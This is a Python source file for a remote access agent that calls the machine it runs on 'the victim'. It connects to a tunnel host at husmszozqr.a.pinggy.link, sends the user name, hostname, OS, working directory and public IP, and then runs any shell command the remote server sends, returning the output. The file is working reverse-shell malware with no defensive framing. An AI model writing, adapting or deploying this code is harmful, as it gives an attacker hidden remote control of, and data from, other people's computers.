import socket
import subprocess
import time
import os
import platform
import getpass
import struct
import json


def get_system_info():
    """The victim collects the machine's system information."""

    return {"type": "RECON", "data": {"user": f"{getpass.getuser()}", "hostname": f"{platform.node()}",
                                   "os": f"{platform.system()} ({platform.release()})", "cwd": f"{os.getcwd()}",
                                   "IP": f"{Command('curl -s ifconfig.me').get('output')}"}}



def send_msg(sock, data_dict):
    """It converts the Python dictionary to JSON, encodes it as UTF-8, and adds a
    4-byte length information (Big-Endian integer)to the beginning before sending it.
    """

    json_bytes = json.dumps(data_dict).encode('utf-8')
    # '>I' -> Big-endian 4-byte unsigned integer
    msg_length = struct.pack('>I', len(json_bytes))
    sock.sendall(msg_length + json_bytes)


def recv_msg(sock):
    """
    First, it reads the 4-byte header, then collects all the JSON data of the specified
    length completely and returns it as a Python dictionary.
    """
    # 1. Read the 4-byte length information.
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]

    # 2. Collect exactly 'msglen' bytes of data.
    msg_bytes = recvall(sock, msglen)
    if not msg_bytes:
        return None

    return json.loads(msg_bytes.decode('utf-8'))


def recvall(sock, n):
    """A helper function that continues reading from the socket until n bytes of data arrive."""
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data


def start_agent():
    SERVER_HOST = 'husmszozqr.a.pinggy.link'
    SERVER_PORT = 15257

    while True:
        agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        agent_socket.settimeout(2)
        try:
            agent_socket.connect((SERVER_HOST, SERVER_PORT))
            print("**pinggy.io is active**", end="")

            send_msg(agent_socket, {"type": "PING"})

            control_b = recv_msg(agent_socket)

            if not control_b or control_b.get("type") != "PUNG":
                raise socket.error("PUNG could not be obtained from the server.")

            agent_socket.settimeout(None)
            print("[+] The server was successfully connected!")
            break

        except socket.error:
            agent_socket.close()
            print("[-] Could not connect to the server, will try again in 3 seconds....")
            time.sleep(3)

    sys_info = get_system_info()
    send_msg(agent_socket, sys_info)

    while True:
        # Receive the command from the server
        command = recv_msg(agent_socket).get("command")

        if not command:
            break

        if command.lower() == 'exit':
            print("[*] A closure order has been received. We are leaving...")
            break

        if command == "PING":
            send_msg(agent_socket, {"command": "PONG"})
            continue

        if command.startswith("cd "):
            # We omit the 'cd' part and only take the target directory path (e.g., 'cd ..' -> '..')
            target_dir = command[3:].strip()

            try:
                os.chdir(target_dir)
                # Once successful, we return the current, up-to-date directory to the server.
                response = {"cwd": os.getcwd()}

            except Exception as e:
                response = f"[-] The directory could not be changed: {str(e)}"

        else:
            response = Command(command)

            # Send the result back to the server.
        send_msg(agent_socket, response)

    agent_socket.close()


def Command(command):
    try:
        # Real command execution mechanism.
        # The stdout and stderr parameters capture the command output and any errors it may have.
        proc = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )

        # Read the command output and error message as bytes.
        stdout_value, stderr_value = proc.communicate()

        # Combine and decode the outputs.
        output = stdout_value + stderr_value
        response = output.decode('utf-8', errors='ignore')

        # If the command was executed but nothing was printed to the screen (e.g., `cd ...`)
        if not response:
            response = "[+] The command was executed (no output)."

    except Exception as e:
        response = f"[-] An error occurred while executing the command.: {str(e)}"

    return {"output": response}


if __name__ == "__main__":
    start_agent()


